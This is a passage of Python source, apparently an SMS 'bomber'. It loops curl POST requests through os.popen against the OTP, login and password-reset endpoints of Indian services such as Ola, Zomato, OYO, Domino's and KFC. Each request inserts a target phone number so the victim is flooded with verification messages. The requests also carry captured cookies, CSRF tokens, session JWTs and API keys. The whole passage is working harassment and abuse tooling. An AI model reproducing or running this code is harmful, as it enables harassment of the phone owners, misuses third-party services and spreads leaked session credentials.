"cookie:s_pers=%20s_vnum%3D1604169000439%2526vn%253D1%7C1604169000439%3B%20s_depth%3D2%7C1603885492899%3B%20s_lv%3D1603883718996%7C1698491718996%3B%20s_lv_s%3DFirst%2520Visit%7C1603885518996%3B%20gpv_pn%3Dmbls_login_main_page%7C1603885519074%3B%20s_invisit%3Dtrue%7C1603885519097%3B%20s_nr3650%3D1603883719122-New%7C1919243719122%3B%20s_nr30%3D1603883719143-New%7C1606475719143%3B%20s_nr120%3D1603883719165-New%7C1614251719165%3B%20s_nr7%3D1603883719184-New%7C1604488519184%3B" -H "cookie:bm_sv=C55140AA532E879E48FCE510EE4D7DFF~ar2Vkg/OEbzM/D2nEqG/q8NfolxN2lT4jdwuq9kbaw6Tuq5FQYggkN0oj238T8DDz8B9tjhoS7x+gAeJZEYuk6pS7CoFG1ngKE98ixgNFYuy5rZmzgRRGnApQMkkSPSL72SPF8hOh7H36cQSSdSBxqwEQ7zqNHoNcmk64t8iRfg=" -H "cookie:_adck_id=4fdb6d7c-9cc8-41f2-8a93-b1b6f24b2979" -H "cookie:_adserveruser_ad_id=null" -H "cookie:_abck=49DFEEA10F4B82F89F83D09A62D84093~0~YAAQ1I0sMV3UOF51AQAAEx7qbgR+qzQDIDykr/YDveVroz7mYwgAaZxdGb4DKZI+XVXbqxnMwvLUNljt0F+sBTCuNX2s+rCcOZX42twjRBXH01LU8XmNd6Zufo5oiukzBKZOnOeMgbrmNr14BDQ/GLLjzCil125zxH+ak99ZI+eFo7BMlvC1WNwjhKOLCYA4O6Qson1O1nk3CorsBYDcqWOJpKAjmz8uaWmxdOz7hRJWoWKZ+uTPwM2Crf1SLmbiHMyzdSZlUIbyiLP55CZu/9DRccG6d3zhbH/BXDCFsQS+8xtZTEzD+NOaxEeIwoNuP5p1Y+Q+dmtt8IQ=~-1~||-1||~-1" -H "cookie:AMCV_1E0D22CE527845790A490D4D%40AdobeOrg=-1712354808%7CMCIDTS%7C18564%7CMCMID%7C69122668996877728323838859128273339164%7CMCAAMLH-1604488429%7C12%7CMCAAMB-1604488429%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1603890831s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C4.3.0" -H "cookie:fltTab=0" -H "cookie:s_ecid=MCMID%7C69122668996877728323838859128273339164" -H "cookie:AMCVS_1E0D22CE527845790A490D4D%40AdobeOrg=1" -H "cookie:__gads=ID=4141333fb27e4dcd-226b07d86cc400a7:T=1603883628:RT=1603883628:S=ALNI_MYC4HXzq54mQHuH7P1shgEPYe8btg" -H "cookie:ak_bmsc=CEAADF4288BCF11000CCB857AACE172E312C8DD4063900006952995F9AE7425D~plocqnTjE8cA1UCnji3Iq2NSbY1TlDRS8GbpKYzYXN7+Zt0tH9LY1NltyfjaZhBvwoj3OAtYp9ehHi0gUJUctXr9b8mu0M8Cqt8vfBcAomTxwsglrGu6Zy2D9m4ItJhPvPH8LvduQoR4nLbtSeGZZFmhYCy+RdMUvrbHzZD1vvTQEH7SOGjc/U6IkFa1HBYIdv5XjZ6eK7ihBjxWpjC0HSnympSSx3Cz35mKjQScBOXT8qFJ/g8/+AcmiNtyWn+aD4nDoOtBbdzO92QTD1yv8Sbg==" -H "cookie:_gcl_au=1.1.373807621.1603883626" -H "cookie:pokusCached=78a1c8959dfd54a3a69e965db4d4da6a3c0a1097" -H "cookie:htlVer=1" -H "cookie:fltVer=2" -H "cookie:npwah=true" -H "cookie:dvid=a3d2f892-af4d-40d1-808a-db6286b8fe1f" -H "cookie:ccde=IN" -H "cookie:bm_sz=8FFF4F9C8A322ED4914209E8181B1D7F~YAAQ1I0sMRLUOF51AQAARO3pbgmJT+1zmwKJs3TfxPV+kweFcHWgWFauhszrF6NDaeLmW2Yd4MVklBIbygarp94vmeRIzOUaQ3z94CkPrk74kcDh06j1VlqamLjLkI+QylO7DqkdyQAOX3TIQ8z3qEfh6VEoRm0ova+DbVvewNUb9IZpa5T0XQfTCMV9dEnVpZdpug==" -d '{"loginId":"'''
                + target +
                '''","type":"MOBILE","version":2,"countryCode":"91"}' "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#61",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:accounts.olacabs.com" -H "content-length:697" -H "x-fingerprint-id:3664542227" -H "csrf-token:v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:*/*" -H "origin:https://accounts.olacabs.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://accounts.olacabs.com/?serviceType=p2p&when=NOW&utm_source=widget_on_olacabs&pickup_name=Current%20Location&drop_lat=26.7729751&drop_lng=82.1457934&drop_name=Faizabad,%20Uttar%20Pradesh%20India&pickup=&lat=26.7705619&lng=82.151815&cid=687045355.1603884269" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:_gat=1" -H "cookie:XSRF-TOKEN=v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I" -H "cookie:_csrf=OBHlYhT8CZfAjUv8sp7YTWD4" -H "cookie:OSRN_v1=WAVlPOqlGgDrpQZWrwT_V0yT" -H "cookie:_gid=GA1.2.788616267.1603884269" -H "cookie:_ga=GA1.2.687045355.1603884269" -d '{"mobileNumber":"'''
                + target +
                '''","dialingCode":"+91","countryCode":"IN","headers":{},"verificationId":null,"captchaInfo":{"gcaptcha":"03AGdBq26mRWBEeBGcFIqhyewjUTfv-Cl4msB5OR3-1NN-IS9kKj3JDAR6MxB0rvNMfhCRqxJccxbUSndGyJvojv2ohDgNe2q8683oSNoD624E20bLqeo6ViMHsgogMvgSmKQUlummiZfr3MUM39UW0T8yJkG1OAEO9-HWTK-wZkEG7bgpxoGFrh1Cw4WwIGPnVZ4-pmulwlAbDCqsgqahK9ngTb8S-EPZu7tFR1srJDE8nF4WhHUR8qsLR1ijem1sNsrdi2-_IihHp3GZqisH1Izt-dmuGW-zSYWyHmZ5EtNcZEk4iA0rxlPpru-n0fxN8RjAH7z4dJJ3vhish9hcyhYYSriKYmiFZzrwO1T72BQrXyx8Xk_zf6YnHwzZms-NEdojlOt87D-t45Fm31IXnTBcTM1-TXZmKCoia6k1kGZmk1arWUMNuSq0SNMh6g42XZ59_I14q_qhM9qF7lMNaSbYOaRQnjlLkA","fingerPrint":3664542227,"storageId":"16038843100270vLePjUljyT3B4eOO8Qvp0VNZ5l"}}' "https://accounts.olacabs.com/api/login" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#62",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:mybookings.easemytrip.com" -H "content-length:24" -H "accept:text/plain, */*; q=0.01" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json; charset=UTF-8" -H "origin:https://mybookings.easemytrip.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://mybookings.easemytrip.com/MyBooking/Profile" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:__stbpnenable=1" -H "cookie:__stgeo="0"" -H "cookie:__stdf=0" -H "cookie:__stp={"visit":"new","uuid":"714d955e-c9df-48b4-9853-a750c4edcf9e"}" -H "cookie:__sts={"sid":1603884684538,"tx":1603884684538,"url":"https%3A%2F%2Fmybookings.easemytrip.com%2FMyBooking%2FProfile","pet":1603884684538,"set":1603884684538}" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.1.1603884682032.457003053" -H "cookie:_gat_UA-12090546-1=1" -H "cookie:_gac_UA-12090546-1=1.1603884681.Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB" -H "cookie:_gid=GA1.2.2094904679.1603884681" -H "cookie:_ga=GA1.2.1719065224.1603884681" -H "cookie:_gcl_au=1.1.99797182.1603884681" -H "cookie:_gcl_aw=GCL.1603884681.Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB" -H "cookie:__auc=7870b1471756efa07a40cd4466a" -H "cookie:__asc=7870b1471756efa07a40cd4466a" -H "cookie:_uetvid=1a44f9b0191111eb9e83c9c023ddc55d" -H "cookie:_uetsid=1a43e630191111ebaef7a5a12cec5701" -H "cookie:CusId=20201028170123" -H "cookie:ReferalCookie=Cj0KCQjwreT8BRDTARIsAJLI0KI5aOU5tsFkXp8bvDpCv9NB8crUEHbEWsOhpW6RhqudUYcsMzWfN1waAiMKEALw_wcB|||||https://www.google.com/" -d '{'emailph':'''
                '+target+'
                '''}' "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#63",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:www.oyorooms.com" -H "content-length:51" -H "xsrf-token:vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:text/plain;charset=UTF-8" -H "accept:*/*" -H "origin:https://www.oyorooms.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.oyorooms.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:bm_sv=66091572F1C84E492CD7D5BEE66695B4~Rl7m9C2L9WRjsYnrvpkefKGZT71sO2cjJZ3UhuDxLmuUjPMapnEY4NCRodCAigmjoGuy7hDnrb0LRLTvSYa0mbGlL/KzbcWbXn9XS8f/auJEWdq7B8cWRp4i9gxP9eX3k0dWncylAUuTfZwfIhjO+cBdof04R4Sglu5ioZ+BkWg=" -H "cookie:_gat=1" -H "cookie:cto_bundle=G4RwDF9uQVJFR0l6ck03aGJiODZUNEJaNnl2bzFaWmQ1djZSNmhWUGQwSDd2NFJ2ZUQ1ODVVTW9NcUd0cGxxcjlETXBEVDVFZ2p4YVVycTBzT3V3Nm85RyUyRnd6aEoySElTckRlcmpjUVJhYmlHcXJjNHNBOTd4cE56TGlqcEJ1b0tnZFFodkpod0lnYkZhNVhvdk5pZlJkTUFZZyUzRCUzRA" -H "cookie:moe_uuid=d9b15c19-958d-4838-a4d8-0e6313f6a899" -H "cookie:_gid=GA1.2.578005218.1603884914" -H "cookie:_ga=GA1.2.289841050.1603884914" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:_fbp=fb.1.1603884913496.917081192" -H "cookie:tvc_utm_content=(not set)" -H "cookie:tvc_utm_key=(not set)" -H "cookie:tvc_utm_campaign=(not set)" -H "cookie:tvc_utm_medium=organic" -H "cookie:tvc_utm_source=google" -H "cookie:_gcl_au=1.1.933447383.1603884913" -H "cookie:fingerprint2=d4f670396357a34731ad7e9b3ea2be0c" -H "cookie:ak_bmsc=98A5361D28FD26A3BFC0784CA4BDAF82312C8DAF685F00006C57995F645EE85A~plep5nNWeUrjqcBoIzjb1evyq2vpGST4++LqieM9AmzCG43w0pDKwnXucM2naUNESgIzGZk6GrsBiWS4bl1bJNvowIfaIfm2F0zDytJn1BbhM00Gq7RS7EBCSVosgcZQjsgb0ErmKbfqHzD+rvclsQzKvtbVYgI4nSuxP7fIP7PXg2Q8n86u2C2iENRy3/eUCDCpDY4ImvjAGyI2kaJgOfyjkcJwXItSImvy2kSe4eRHBCSVp88WS+YBvt1g/Kw2Vpc+zJxLP8Qj2yDSswwqvQSg==" -H "cookie:isHomepageViewed=true" -H "cookie:XSRF-TOKEN=vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0" -H "cookie:_uid=Not%20logged%20in" -H "cookie:token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D" -H "cookie:appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D" -H "cookie:expd=mww2%3A1%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A1%7Cpwbs%3A1%7Cmwsb%3A0%7Cslin%3A1%7Chsdm%3A2%7Clpex%3A1%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A0%7Cprdp%3A1%7Ccomp%3A1%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A0%7Cgmbr%3A0%7Cyolo%3A0%7Crcta%3A0" -H "cookie:_csrf=fX6oskHhiVSy9V0SQqOspeoe" -H "cookie:mab=2e11992dc4c54dd59fe36360f6447c97" -H "cookie:X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DHR%2Ccity%3DAMBALA%2Clat%3D30.38%2Clong%3D76.78%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D55836%2Cnetwork_type%3Dmobile%2Clocation_id%3D0" -H "cookie:acc=IN" -d '{"phone":"'''
                + target +
                '''","country_code":"+91","nod":4}' "https://www.oyorooms.com/api/pwa/generateotp?locale=en" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#64",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:in.bookmyshow.com" -H "content-length:108" -H "accept:application/json" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://in.bookmyshow.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber='''
                + target +
                '''&email=&source=web" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_uetvid=304ac2c0191211ebb4d2cbc446845671" -H "cookie:_uetsid=30481cb0191211ebac307b72fd063244" -H "cookie:WZRK_S_RK4-47R-98KZ=%7B%22p%22%3A2%2C%22s%22%3A1603885148%2C%22t%22%3A1603885159%7D" -H "cookie:sessionId=1603885159122" -H "cookie:__cfruid=349d4cbcb4077b53c92af99cd2a8ea17832e3c5d-1603885151" -H "cookie:rgn=%7B%22regionCode%22%3A%22ABOR%22%2C%22regionName%22%3A%22Abohar%22%2C%22subCode%22%3A%22%22%2C%22subName%22%3A%22%22%2C%22regionNameSlug%22%3A%22abohar%22%2C%22regionCodeSlug%22%3A%22abor%22%2C%22Lat%22%3A%2230.1453%22%2C%22Long%22%3A%2274.1993%22%7D" -H "cookie:overrideArea=%22true%22" -H "cookie:userNotified=false" -H "cookie:_gat_UA-27207583-8=1" -H "cookie:tvc_bmscookie_gid=GA1.2.1463184875.1603885148" -H "cookie:tvc_bmscookie=GA1.2.323425446.1603885148" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:_fbp=fb.1.1603885147662.1946366717" -H "cookie:WZRK_G=0cf00ce388574ff6ba9d04426bc06a73" -H "cookie:_gcl_au=1.1.1582607514.1603885145" -H "cookie:preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D" -H "cookie:bmsId=1.613310084.1603885142414" -H "cookie:__cfduid=d7a425d4143ee46199b515af6a6b0c8581603885142" -d '{"channel":"phone","subChannel":"sms","details":{"phone":"'''
                + target +
                '''","origin":"https://in.bookmyshow.com"}}' "https://in.bookmyshow.com/pwa/api/uapi/otp/send" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#65",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:www.zomato.com" -H "content-length:80" -H "x-zomato-csrft:74a094f89ea708a8f3b78c9a6df38349" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:*/*" -H "origin:https://www.zomato.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.zomato.com/kanpur" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:g_state={"i_p":1603892852968,"i_l":1}" -H "cookie:AWSALBTGCORS=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV" -H "cookie:AWSALBTG=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV" -H "cookie:_uetvid=4f6b1b10191311ebb65cabc7eb49e843" -H "cookie:_uetsid=4f69c050191311eba1032d186f404b1a" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.1.1603885628996.1156015945" -H "cookie:_gat_country=1" -H "cookie:_gat_city=1" -H "cookie:_gat_global=1" -H "cookie:_gcl_au=1.1.1605422707.1603885626" -H "cookie:_gid=GA1.2.1616354908.1603885626" -H "cookie:_ga=GA1.2.1373047799.1603885626" -H "cookie:locus=%7B%22addressId%22%3A0%2C%22lat%22%3A26.4607%2C%22lng%22%3A80.3334%2C%22cityId%22%3A23%2C%22ltv%22%3A23%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A15750%2C%22fen%22%3A%22Kanpur%22%7D" -H "cookie:lty=city" -H "cookie:ltv=23" -H "cookie:ak_bmsc=D218CC214FA71C400C71BCF2A3F35579B855DCCF7E2E0000385A995FC9E77F4B~plAF7CBZ4PUj3czKvHvfBmp17I7Gj84YwU/0/+iZ5dRIj4xWHOwmKUWPdyTqKBKi3TE3lM8CxyfsMzbyYuRmFcpDpfOCdd4K430P5HBMYUsQw6Q2mFqX2Sa9XmIq1UHabDzo9aakYe1BEM/3nLCDxoeuEVJ71uQ2Njm/dq/49iGxDmhDChYPLpOeyxqL2CKhK9QR0dzFme5AYD0/RDjh81kY7WBkfgnz5NoX1N+t69fQA=" -H "cookie:csrf=74a094f89ea708a8f3b78c9a6df38349" -H "cookie:PHPSESSID=de653951716ab490d5639700c776d524" -H "cookie:fbtrack=4f77e94d432d648e26273c38b002b7e3" -H "cookie:zl=en" -H "cookie:fbcity=23" -d '{"country_id":1,"phone":"'''
                + target +
                '''","verification_type":"sms","method":"phone"}' "https://www.zomato.com/webroutes/auth/login"  > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#66",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:api.dominos.co.in" -H "content-length:52" -H "strict-transport-security:max-age=1636116872593" -H "access-control-allow-methods:GET, POST, PATCH, PUT, DELETE, OPTIONS" -H "x-content-type-options:nosniff" -H "api_key:d2aeb489bb8df385" -H "ga_client_id:559252815.1604559839" -H "status:SUCCESS" -H "secretkey:dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp" -H "userid:48747cab-a7b9-4dc9-b8dc-eabbb9883d72" -H "x-forwarded-for-requestid:1604559920579-48747cab-a7b9-4dc9-b8dc-eabbb9883d72" -H "cartid:1823648622264698" -H "source:PWA18#upsellC" -H "isloggedin:false" -H "client_type:web app-chrome" -H "accesskeyid:ASIAWMIT2NXASDYLBK5W1604559840" -H "x-frame-options:mitigate" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "credentials:[object Object]" -H "deliverytype:D" -H "authtoken:ASIAWMIT2NXASDYLBK5W1604559840" -H "access-control-allow-origin:" -H "accept:application/json, text/plain, */" -H "sessiontoken:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8" -H "content-type:application/json" -H "access-control-allow-headers:*" -H "storeid:6585R" -H "ab_test_variant:New Flow" -H "origin:https://m.dominos.co.in" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.dominos.co.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"lastName":"","mobile":"'''
                + target +
                '''","firstName":""}' "https://api.dominos.co.in/loginhandler/forgotpassword" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#67",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:api.pizzahut.io" -H "content-length:25" -H "x-trace-id:f222f460-946d-4c59-bb9e-e87db924399c" -H "x-environment-flag:production" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "recaptcha-token:03AGdBq25_PaOvx0wAkF3F42ZlMFOK_MV_jF_Q02EKNfJN8lM1f5HSf9d4yxlWDX0Le16IU8rhHV_IUx_CkclsYMviCYTWbvdiiiaUjzTCt52xgED29gx9PW5i0enDH01ne5h3-7hE5d1XFUDaNz33HvJHsupCC1fkOXCHRmkVDOIrKrP-ucgZk8QOOtAgIfe8PJ5JkPH1eLdKVyJb5Sd3lYd8zPZUim1pt59CqOeuK_YD4PQVMt1vBoazROTGEFBfqapC40sBHBK-EbG3CjOCc3y9f7jVinXG8MZ8nhEbfUwqE4b5bGVaV3UAe3isB441XwKqYxVibHbPQwY90oq5O5o1aGB2i6aN7AUo2o5zUYA1uRIVdFZuKlZ7G2k4QusN9seS6HqHv3xESCH-C8Zk3L9QOYiO6pczr9YnkKPX8jl1lt2z4YiTRuyz1oVCFFD8qd8YFj2LMPKqgLNr8DGBPpbLtQhwArKtzQ" -H "content-type:application/json; charset=utf-8" -H "accept:/" -H "origin:https://www.pizzahut.co.in" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"phone":"+91'''
                + target +
                '''"}' "https://api.pizzahut.io/v1/otp/generate" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#68",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:online.kfc.co.in" -H "content-length:65" -H "accept:application/json, text/plain, /" -H "__requestverificationtoken:x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "origin:https://online.kfc.co.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://online.kfc.co.in/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:AWSALBCORS=MeqABDSeOyrESZIiOztr+/dF2jLY1lkvK/lkcXOvFnhiQE175smiXPicimckBVoNVVsLYORg6pCeywKiRTWMEBWbvx6yuaue6opXNERoCV1DWLQY36Eeg8SArhQp" -H "cookie:AWSALB=MeqABDSeOyrESZIiOztr+/dF2jLY1lkvK/lkcXOvFnhiQE175smiXPicimckBVoNVVsLYORg6pCeywKiRTWMEBWbvx6yuaue6opXNERoCV1DWLQY36Eeg8SArhQp" -H "cookie:bm_sv=53C041FCCE2D6FD3321A79351020FAEE~j7cP9L6VSQPYRsbqLGwt8RzkCA7V09u+MYoqGjWndCnTL4j208Z54azeQUSPERX7dHmnfetoe8Blit8FcvWB+lLO0Gio3JdGnOK81vxniNzaz/6Czf75vPN75p3DpRRdLJZVk7M3y6fx6tdmSpXyoBG7KiNxW+q5BbuJE3qcazw=" -H "cookie:_uetvid=13d96d501f3611eb9d18c9a8fb16b76e" -H "cookie:_uetsid=13d701c01f3611eb9030050f6efd80a0" -H "cookie:cto_bundle=v6U7KV9RV1NKVWtoSEtBdDMya1dZTlc4b2M2dzQzM0MlMkZ1T2VoRnhDWEh1eDJ1N0k1OERVQ2lldWhsbFBMckpQeGRNdUZURmdZM0FDa3VmckJnaXdKOUJpOEpWSzQlMkZuMldDMVJkNVpnWXJmUmt1dkZSYW1wSXRvWUkzVjY5RHZXVyUyRkFGVVNJJTJGRUtZNzglMkI5NXBvcFBpOFppVmNnJTNEJTNE" -H "cookie:_gat_UA-39424837-1=1" -H "cookie:_fbp=fb.2.1604560269277.677327095" -H "cookie:_gid=GA1.3.377892622.1604560269" -H "cookie:_ga=GA1.3.414417970.1604560269" -H "cookie:_gcl_au=1.1.1092294754.1604560267" -H "cookie:ak_bmsc=860EE33AEA9A8D4CE7CD119FB1EC9729173A5D44517B000088A5A35F5D2C630E~plrfzJjarBUPpvI/sB4VDBhfhmuvZmyIdTSmfJO51YDwdxrYhO0dYKeemjEYuml7EVEmBBdQHQH6HS9LQu4ykNnTUlBRrT6uVYBR7TpoT6tdxQeizvLILFLVbF5pTz7NTBq5WZOF6g9erOVAkhbUIbwYYz4iCzqJCl2Wo1ylX8ymzBU6aGw/kZg4pdvpcnJUSSukS06r35CrtmMWdb97+iPdRAdyMWIEJbjdgxbSjv4d+TygRxNTcW6i2u4YdYMh2K0ecaobDsPHqhZw8158pNpw==" -H "cookie:bm_mi=10E2246CA83B5612391BF358428BA8FF~a4AjJ6XvWPiCIqFnU4fyEM78uMiZ4SlzvPaSmlVSrOb+W72E6X9ohJm7wc2y1PLh74Iy2fUNtO+abymSudnyymsw19y9ObFoESGl0lqkXYd9MV3Ee1GWTgw0PtiiEsNTA3PF5Kn6Ch7sQWs+8uE+cToMSn2/QGSD6uT134pquP2Dz08bhPW3MgdTwFfp6+hkHftBKJFUSshzbqRDgERqde8PyHPHj4Njzgor9fND94EQrXchiz1L1ySYsHiSaaDf/qCLVJF0yXYg9Z33xk/ifAQ7cFDtvj2jCDnueLCplvM=" -H "cookie:KFCI.A.SID_o=low4l2ltqydlp2mwtosdmg5k" -H "cookie:KFCI.A.SID=low4l2ltqydlp2mwtosdmg5k" -H "cookie:KFCI.IMS=False" -H "cookie:KFCI.LC=en-US" -H "cookie:KFCI.ReMe=False" -H "cookie:KFCI.CHNL=All" -H "cookie:KFCI.IPO=False" -H "cookie:KFCI.ASD=False" -H "cookie:KFCI.OM=None" -d '{"phoneNumber":"'''
                + target +
                '''","AuthorizedFor":"3","Resend":"false"}' "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#69",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:consumer-apis.burgerking.in" -H "content-length:23" -H "appversion:1.6" -H "authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70" -H "content-type:application/json" -H "access-control-allow-origin:" -H "accept:application/json, text/plain, */" -H "timestamp:1604561218463" -H "userid:TEMP6922285271604561176" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "platform:web" -H "type:dinein" -H "encryptionkey:39c9c62a58dc93a3787b7dc7727b289b7583b678d44fc2c17e2887150a11db38" -H "origin:https://www.burgerking.in" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.burgerking.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"phone_no":'''
                + target +
